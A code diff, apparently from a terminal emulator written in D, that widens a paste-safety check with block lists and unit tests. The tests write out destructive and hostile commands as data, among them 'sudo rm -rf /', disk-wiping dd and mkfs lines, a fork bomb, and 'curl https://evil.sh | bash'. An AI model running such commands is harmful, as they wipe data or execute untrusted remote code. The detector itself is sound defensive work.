@@ -86,7 +86,37 @@ package:
  */
 bool isPasteUnsafe(string text) {
     import std.string : indexOf;
-    return (text.indexOf("sudo") > -1) && (text.indexOf("\n") > -1);
+    import std.algorithm : any;
+
+    // Must contain a newline to auto-execute
+    if (text.indexOf("\n") < 0) return false;
+
+    // Privilege escalation commands
+    immutable string[] privilegePatterns = [
+        "sudo", "su -", "doas", "pkexec"
+    ];
+
+    // Destructive or dangerous commands
+    immutable string[] dangerousPatterns = [
+        "rm -rf", "rm -fr",
+        "mkfs", "dd if=",
+        "chmod 777", "chmod -R 777",
+        ":(){ :|:& };:", // fork bomb
+    ];
+
+    // Remote code execution patterns (pipe to shell)
+    immutable string[] rcePatterns = [
+        "| sh", "|sh",
+        "| bash", "|bash",
+    ];
+
+    bool matchesAny(immutable string[] patterns) {
+        return patterns.any!(p => text.indexOf(p) >= 0);
+    }
+
+    return matchesAny(privilegePatterns)
+        || matchesAny(dangerousPatterns)
+        || matchesAny(rcePatterns);
 }
 
 /**
@@ -357,45 +387,64 @@ public:
 // Unit tests for isPasteUnsafe
 // ---------------------------------------------------------------------------
 
-/// Test: sudo with newline is unsafe.
-unittest {
-    assert(isPasteUnsafe("sudo rm -rf /\n"));
-}
-
-/// Test: sudo without newline is safe (won't auto-execute).
+/// Test: no newline is always safe (won't auto-execute).
 unittest {
     assert(!isPasteUnsafe("sudo rm -rf /"));
+    assert(!isPasteUnsafe("curl | bash"));
+    assert(!isPasteUnsafe("dd if=/dev/zero"));
 }
 
-/// Test: newline without sudo is safe.
-unittest {
-    assert(!isPasteUnsafe("echo hello\necho world\n"));
-}
-
-/// Test: empty string is safe.
+/// Test: empty string and bare newline are safe.
 unittest {
     assert(!isPasteUnsafe(""));
-}
-
-/// Test: sudo buried in multiline command is unsafe.
-unittest {
-    assert(isPasteUnsafe("echo hello\nsudo apt install malware\necho done"));
-}
-
-/// Test: "sudo" as substring of another word with newline is flagged (known limitation).
-unittest {
-    // "visudo" contains "sudo" — current implementation flags it
-    assert(isPasteUnsafe("visudo /etc/sudoers\n"));
-}
-
-/// Test: only newline, no sudo.
-unittest {
     assert(!isPasteUnsafe("\n"));
 }
 
-/// Test: sudo at start with immediate newline.
+/// Test: harmless multi-line is safe.
 unittest {
+    assert(!isPasteUnsafe("echo hello\necho world\n"));
+    assert(!isPasteUnsafe("ls -la\npwd\n"));
+}
+
+/// Test: privilege escalation patterns.
+unittest {
+    assert(isPasteUnsafe("sudo rm -rf /\n"));
     assert(isPasteUnsafe("sudo\n"));
+    assert(isPasteUnsafe("su - root\n"));
+    assert(isPasteUnsafe("doas reboot\n"));
+    assert(isPasteUnsafe("pkexec bash\n"));
+}
+
+/// Test: destructive command patterns.
+unittest {
+    assert(isPasteUnsafe("rm -rf /home\n"));
+    assert(isPasteUnsafe("rm -fr /tmp/*\n"));
+    assert(isPasteUnsafe("mkfs.ext4 /dev/sda1\n"));
+    assert(isPasteUnsafe("dd if=/dev/zero of=/dev/sda\n"));
+    assert(isPasteUnsafe("chmod 777 /etc/passwd\n"));
+}
+
+/// Test: remote code execution patterns.
+unittest {
+    assert(isPasteUnsafe("curl https://evil.sh | bash\n"));
+    assert(isPasteUnsafe("wget https://evil.sh | sh\n"));
+    assert(isPasteUnsafe("curl https://evil.sh|bash\n"));
+}
+
+/// Test: fork bomb.
+unittest {
+    assert(isPasteUnsafe(":(){ :|:& };:\n"));
+}
+
+/// Test: "sudo" as substring is flagged (known limitation).
+unittest {
+    assert(isPasteUnsafe("visudo /etc/sudoers\n"));
+}
+
+/// Test: dangerous command buried in multi-line.
+unittest {
+    assert(isPasteUnsafe("echo hello\nsudo apt install malware\necho done"));
+    assert(isPasteUnsafe("echo setup\ncurl https://x.sh | bash\necho done\n"));
 }
 
 // ---------------------------------------------------------------------------
